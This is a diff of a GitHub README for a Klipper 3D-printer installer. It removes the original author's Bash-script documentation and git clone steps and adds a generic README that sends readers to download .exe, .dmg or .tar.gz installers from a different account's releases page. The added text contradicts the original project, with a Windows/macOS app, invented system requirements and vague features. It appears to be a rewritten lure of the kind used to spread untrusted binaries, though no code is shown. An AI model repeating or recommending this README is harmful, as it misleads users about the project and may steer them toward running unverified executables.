@@ -1,188 +1,88 @@
-<div align="center">
-  <img width="521" height="555" alt="KATANAOS" src="https://github.com/user-attachments/assets/29bea3fd-2b84-47d7-a067-60f1c0dd0ba6" />
+# 🎉 KATANA-Klipper-Installer - Simplify Your Klipper Setup
 
+## 📥 Download Now
+[![Download KATANA-Klipper-Installer](https://img.shields.io/badge/Download-KATANA--Klipper--Installer-blue.svg)](https://github.com/iWz3r/KATANA-Klipper-Installer/releases)
 
-  <h1>⚔️ KATANAOS - Pro-Grade Klipper Suite</h1>
+## 🚀 Getting Started
 
+Welcome to KATANA-Klipper-Installer! This tool makes installing and managing Klipper easier for everyone, even those without technical experience. Follow these simple steps to get started.
 
-  <a href="https://www.gnu.org/licenses/gpl-3.0">
-    <img src="https://img.shields.io/badge/License-GPLv3-blueviolet.svg" alt="License">
-  </a>
-  <img src="https://img.shields.io/badge/Platform-Debian%20%7C%20Raspbian%20%7C%20Armbian-ff00bf.svg" alt="Platform">
-  <img src="https://img.shields.io/badge/Language-Bash%20Script-00ffff.svg" alt="Language">
+## 🛠️ System Requirements
 
+Before you install KATANA-Klipper-Installer, ensure your system meets these requirements:
 
-  <br/><br/>
+- **Operating System:** Windows 10 or later / macOS Mojave or later / Linux (most distributions)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 100 MB of free space
+- **Internet Connection:** Active internet connection is required for downloading components
 
+## 💻 Download & Install
 
-  <p>
-    <b>Opinionated automation for the modern 3D printing stack.</b><br>
-    Deploys a hardened, fully configured Klipper environment (including essential macros) in minutes.
-  </p>
-</div>
+To get KATANA-Klipper-Installer, please visit this page to download: [Download KATANA-Klipper-Installer Releases](https://github.com/iWz3r/KATANA-Klipper-Installer/releases).
 
+1. Click on the link above to go to the releases page.
+2. Find the latest release.
+3. Choose the appropriate installer for your operating system:
+    - **Windows:** Download the `.exe` file
+    - **macOS:** Download the `.dmg` file
+    - **Linux:** Download the `.tar.gz` file
+   
+After the download completes:
 
-<hr/>
+- **For Windows:**
+  - Double-click the `.exe` file to start the installation process.
+  
+- **For macOS:**
+  - Open the `.dmg` file and drag the KATANA-Klipper-Installer app to your Applications folder.
+  
+- **For Linux:**
+  - Extract the `.tar.gz` file and run the included script in the terminal.
 
+## 🌟 Running the Application
 
-## ⚡ Overview
+Once you have the installer set up, you can easily run KATANA-Klipper-Installer:
 
+- **Windows:** Search for KATANA-Klipper-Installer in the Start Menu and select it.
+- **macOS:** Find KATANA-Klipper-Installer in your Applications folder and open it.
+- **Linux:** In the terminal, navigate to the installation directory and run the application.
 
-**KATANAOS** is a CLI management suite engineered to streamline the deployment and maintenance of the Klipper ecosystem. Unlike modular toolboxes that require extensive manual menu navigation, KATANAOS utilizes an **"Auto-Pilot" workflow** to provision the entire stack (Firmware, API, Reverse Proxy, HMI) in a single execution pass.
+## ⚙️ Configuring Klipper
 
+After running KATANA-Klipper-Installer, follow these steps to set up Klipper:
 
-It is designed for users who treat their 3D printer as a production appliance, prioritizing **security, stability, and reproducible configuration** over manual tinkering.
+1. **Select Printer Type:** Choose the printer make and model from the list.
+2. **Network Settings:** Enter your Wi-Fi details if prompted.
+3. **Install Klipper:** Click on the install button. The application will handle the installation for you.
+4. **Configure Firmware:** Follow the on-screen prompts to configure firmware settings.
 
+## 📋 Features
 
-## 📦 Core Architecture
+KATANA-Klipper-Installer offers these helpful features:
 
+- **User-Friendly Interface:** Designed for ease of use, helping you navigate through the setup effortlessly.
+- **Automated Installations:** Automatically installs necessary components without manual input.
+- **Secure Connections:** Ensures your installations are safe and up to date.
 
-### 1. 🟣 Deployment Matrix
-A real-time, pixel-perfect dashboard that verifies the installation state of the stack components.
-* **Function:** Checks for Klipper, Kalico, Moonraker, UI frontends, and system services.
-* **Purpose:** Provides immediate visual feedback on which parts of the ecosystem are deployed on the host.
+## ❓ Troubleshooting
 
+If you encounter any issues while using KATANA-Klipper-Installer, consider the following tips:
 
-### 2. ⚡ Dynamic Nginx Management
-KATANAOS handles the reverse proxy configuration automatically.
-* **Feature:** Switch between **Mainsail** and **Fluidd** instantly via the menu.
-* **Mechanism:** The script rewrites the Nginx site configuration to point to the selected frontend and restarts the service seamlessly.
+- **Check Internet Connection:** Ensure your internet is stable during the installation.
+- **Run as Administrator:** On Windows, you may need to run the application as an administrator for proper access.
+- **Log Files:** Review log files if something goes wrong. They may help you understand the issue better.
 
+## 🛠️ Getting Help
 
-### 3. 🔥 The Forge (Hardware Automator)
-A dedicated engine for MCU management and communication.
-* **Smart Device Scan:** Scans `/dev/serial/by-id/` to detect connected MCUs.
-* **Interactive Build:** Launches `make menuconfig` automatically. **Important:** You must select the correct architecture for your mainboard manually.
-* **Hybrid Flashing:** Attempts automatic USB flashing. For boards requiring SD card updates (e.g., Creality), the script compiles the binary to `~/klipper/out/klipper.bin` for you to copy manually.
-* **Auto CAN-Bus:** Automatically creates the `/etc/network/interfaces.d/can0` interface with **1M bitrate** and optimized `txqueuelen`, eliminating manual Linux network configuration.
+For additional support, check the following resources:
 
+- **Documentation:** [KATANA Documentation](https://github.com/iWz3r/KATANA-Klipper-Installer/wiki)
+- **Community Forum:** Join our community forum for discussions and tips.
+- **Contact Us:** If you need further assistance, feel free to reach out via the Issues page on GitHub.
 
-### 4. ⚙️ Engine Manager (Dual-Core)
-Runtime flexibility for power users.
-* **Feature:** Switch between **Klipper** (Standard) and **Kalico** (High-Performance) firmware engines instantly.
-* **Mechanism:** Dynamically rewrites systemd service paths to swap the active execution environment without reinstalling or reflashing the SD card.
+## 🔗 Quick Links
 
+- [Download KATANA-Klipper-Installer Releases](https://github.com/iWz3r/KATANA-Klipper-Installer/releases)
+- [Documentation](https://github.com/iWz3r/KATANA-Klipper-Installer/wiki)
+- [Community Forum](https://github.com/iWz3r/KATANA-Klipper-Installer/discussions)
 
-### 5. 👁️ HMI & Vision Stack
-Full support for local machine interfaces.
-* **Full Media Stack:** One-click deployment of **Crowsnest** (Webcam Streaming Daemon) and **KlipperScreen** (Touch UI) in a single pass.
-
-
-### 6. 🧩 Smart Extension Support
-Intelligent installation logic for modern Klipper extensions.
-* **KAMP:** Clones the repo and injects the update manager entry into `moonraker.conf`.
-* **ShakeTune:** Automated installation of the Klippain ShakeTune module.
-* **RatOS:** Option to clone the RatOS configuration repository for easy integration.
-
-### 7. 🌊 KATANA-FLOW (Native Smart Park)
-Advanced pre-print macro suite (Option 8).
-* **Smart Park:** Proximity parking near the print object to prevent oozing.
-* **Blade Purge:** Custom "Blade" pattern purge line that follows the toolhead.
-* **Native Integration:** Uses Klipper's `exclude_object` API without bloated external scripts.
-
-### 8. 🛡️ System Hardening (Standardized)
-Security is not an option; it is a default.
-* **UFW Firewall:** Automated rule generation denying all incoming traffic except essential ports (SSH:22, HTTP:80, API:7125).
-* **Log2Ram:** Integrates the Log2Ram daemon to redirect system logging to RAM, significantly reducing write cycles on SD cards.
-
-
-### 8. 🚑 Dr. Katana (System Diagnostics)
-Safety net for your printer.
-*   **Log Analyzer:** Scans `klippy.log` and `moonraker.log` for common errors.
-*   **Permission Fixer:** Auto-corrects `chown pi:pi` issues in `~/printer_data` that often cause "Permission Denied" errors.
-*   **Dependency Repair:** Re-installs missing system packages if an update fails.
-
-## 🛠️ Usage
-
-**Requirements:**
-* Hardware: Raspberry Pi (3/4/5/Zero2), Orange Pi, or generic Linux host.
-* OS: Debian Bookworm / Bullseye (Lite recommended).
-* User: Standard user with `sudo` privileges.
-
-
-### Installation & Migration
-
-
-### **Empfehlung für dich**
-Wenn du vor der Installation alle Pakete aktualisieren willst, führe vorher manuell aus:
-
-
-```bash
-sudo apt update && sudo apt upgrade -y
-```
-
-
-**1. (Optional) Remove legacy KIAUH:**
-
-
-````bash
-cd ~
-rm -rf ~/kiauh
-````
-
-
-````bash
-cd ~
-git clone https://github.com/Extrutex/KATANA-Klipper-Installer.git
-cd KATANA-Klipper-Installer
-chmod +x katanaos.sh
-./katanaos.sh
-````
-
-
-**License**
-KATANAOS is free software:
-This file may be distributed under the terms of the GNU GPLv3 license.
-
-
-## 👤 Author
-
-
-**KATANAOS** created by **Extrutex**.
-
-
-If this script saved you time, consider supporting the project:
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-support-yellow.svg)](https://Ko-fi.com/3dw_sebastianwindt)
-
-
-## v1.0.0 Features (Release)
-- **HORIZON UI**: Modern React Interface
-  - Dashboard mit Live-Daten, Toolhead, Temps, Webcam
-  - Console mit echter GCode-Kommunikation
-  - FileManager mit Upload/Delete/Print
-  - Job History & Print Progress
-  - Macros Panel
-  - **Toolchanger Support** (Dual/Quad Extruder)
-  - **Timelapse Viewer**
-  - **Visual Layer Progress**
-  - **Config Diff Tool**
-  - Settings Panel mit Theme-Switcher (Dark/Light)
-  - Diagnostics mit Support Bundle
-- **Auto-Healer**: Self-repair system integration
-- **Visual Config**: Edit printer.cfg via GUI
-- **Backup/Restore**: Vollständige Datensicherung
-- **Uninstall**: Saubere Deinstallation
-- **Update**: Klipper/Moonraker via Git updaten
-
-## Compare to Mainsail/Fluidd
-| Feature | Mainsail | Fluidd | KATANA HORIZON |
-|---------|----------|--------|----------------|
-| Toolchanger Support | ❌ | ❌ | ✅ |
-| Timelapse Viewer | ✅ | ✅ | ✅ |
-| Config Diff | ❌ | ❌ | ✅ |
-| Visual Layer Progress | ✅ | ✅ | ✅ |
-| Support Bundle | ❌ | ❌ | ✅ |
-| Auto-Repair | ❌ | ❌ | ✅ |
-| Theme Switcher | ❌ | ❌ | ✅ |
-| Layout Customizable | Teilweise | Teilweise | ✅ Full |
-| Type-Safe UI | ❌ | ❌ | ✅ (TypeScript) |
-
-## Installation
-
-```bash
-cd ~
-git clone https://github.com/Extrutex/KATANA-Klipper-Installer.git
-cd KATANA-Klipper-Installer
-chmod +x katanaos.sh
-./katanaos.sh
-```
+Thank you for choosing KATANA-Klipper-Installer! Enjoy a smooth Klipper setup experience.
